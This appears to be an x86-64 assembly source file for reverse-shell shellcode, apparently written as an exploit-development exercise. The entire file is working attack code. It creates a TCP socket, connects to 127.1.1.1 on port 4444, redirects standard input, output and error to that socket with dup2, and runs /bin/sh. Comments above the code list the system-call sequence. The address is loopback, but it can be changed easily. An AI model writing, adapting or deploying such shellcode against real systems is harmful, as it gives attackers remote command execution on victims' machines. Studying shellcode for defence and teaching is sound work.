section .text
global _start

_start:
	
;execve("./reverse", ["./reverse"], 0x7ffdd69cc418 /* 49 vars */) = 0
;socket(AF_INET, SOCK_STREAM, IPPROTO_IP) = 3
;connect(3, {sa_family=AF_INET, sin_port=htons(4444), sin_addr=inet_addr("127.1.1.1")}, 16) = 0
;dup2(3, 0)                              = 0
;dup2(3, 1)                              = 1
;dup2(3, 2)                              = 2
;execve("/bin/sh", NULL, NULL)           = 0

	; clearing rax, rdi, rsi, rdx
	xor rax, rax
	xor rdi, rdi
	xor rsi, rsi
	xor rdx, rdx

	;socket
	add rax, 41 ;syscall number for socket
	add rdi, 2
	add rsi, 1
	syscall
	
	mov rdi, rax

	; preparing structure for connect
	push 0x0101017F
	push word 0x5c11
	push word 0x2

	;connect
	mov rsi, rsp
	add rdx, 0x10
	xor rax, rax
	add rax, 42
	syscall

	;dup2 STDIN
	xor rax, rax
	add rax, 33
	xor rsi, rsi
	syscall	

	;dup2 STDOUT
	xor rax, rax
	add rax, 33
	add rsi, 1
	syscall

	;dup2 STDERR
	xor rax, rax
	add rax, 33
	add rsi, 1
	syscall

	;execve
	xor rax, rax
	mov rdx, rax
	mov rsi, rdx

	push rax
	mov rbx, 0x68732f6e69622f2f
	push rbx
	mov rdi, rsp

	add rax, 59
	syscall
	
